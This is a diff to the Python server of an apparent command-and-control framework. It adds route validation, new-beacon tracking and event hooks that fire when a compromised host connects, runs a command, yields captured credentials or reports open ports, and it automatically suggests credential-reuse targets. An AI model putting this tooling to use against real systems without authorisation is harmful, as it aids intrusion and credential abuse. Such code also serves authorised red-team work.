@@ -2493,6 +2493,11 @@ if not route_malleable:
     logging.error("Error: c2_malleable_route not found on payload.json")
     sys.exit(1)
 
+route_valid, route_error = _validate_route_path(route_malleable.lstrip("/"))
+if not route_valid:
+    logging.error("Error: c2_malleable_route is invalid: %s", route_error)
+    sys.exit(1)
+
 if not os.path.exists(atomic_framework_path):
     shell.onecmd('atomic_tests')
 
@@ -2836,6 +2841,7 @@ def receive_result(client_id):
             }
 
             logging.info(f"Received output from {sanitized_client_id}: {output[:100]} Platform: {client}")
+            _was_new_beacon = sanitized_client_id not in connected_clients
             connected_clients.add(sanitized_client_id)
             logging.info(f"Client {sanitized_client_id} registered as connected")
 
@@ -2891,6 +2897,59 @@ def receive_result(client_id):
                 ).start()
             except Exception:
                 pass  # engagement hook must never affect beacon response
+
+            # ── Conditional Hooks: fire operator-defined rules ──────────────────
+            try:
+                _was_new = _was_new_beacon
+                _primary_ip = str(ips).split(",")[0].strip().strip("[]'\"") if ips else str(hostname)
+                from modules.conditional_hooks import get_hook_engine as _get_hooks
+                _hook_engine = _get_hooks()
+                _hook_engine.set_placeholders({
+                    "rhost": str(getattr(config, 'rhost', '')),
+                    "lhost": str(getattr(config, 'lhost', '')),
+                    "domain": str(getattr(config, 'domain', '')),
+                })
+
+                _hctx = {
+                    "client_id": str(sanitized_client_id),
+                    "ip": _primary_ip,
+                    "hostname": str(hostname),
+                    "user": str(user),
+                    "platform": str(client),
+                    "command": str(command),
+                    "output": str(output)[:500],
+                }
+
+                if _was_new:
+                    _hook_engine.fire("beacon_connected", _hctx)
+
+                _hook_engine.fire("command_executed", _hctx)
+
+                if result_pwd:
+                    _hook_engine.fire("credential_captured", _hctx)
+                    try:
+                        from modules.credential_reuse import get_credential_reuse_engine as _get_cre
+                        def _bg_cred_reuse(_ip=str(_primary_ip)):
+                            _cre = _get_cre()
+                            from modules.state_manager import StateManager as _SM
+                            _st = _SM()
+                            _candidates = _cre.suggest_from_state_manager(_st, limit=10)
+                            if _candidates:
+                                _summary = _cre.get_summary(_candidates)
+                                logging.info("[cred_reuse]\n%s", _summary)
+                        _thr.Thread(target=_bg_cred_reuse, daemon=True).start()
+                    except Exception:
+                        pass
+
+                if result_portscan:
+                    for _ps in str(result_portscan).split(","):
+                        try:
+                            _port = int(_ps.strip())
+                            _hook_engine.fire("service_detected", {"port": _port, "host": _primary_ip})
+                        except ValueError:
+                            pass
+            except Exception as _hook_exc:
+                logging.debug("[hooks] fire failed: %s", _hook_exc)
 
             # ── C2 Bidirectionality: feed beacon output back into knowledge pipeline ──
             # This runs in a background thread so it never delays the beacon response.
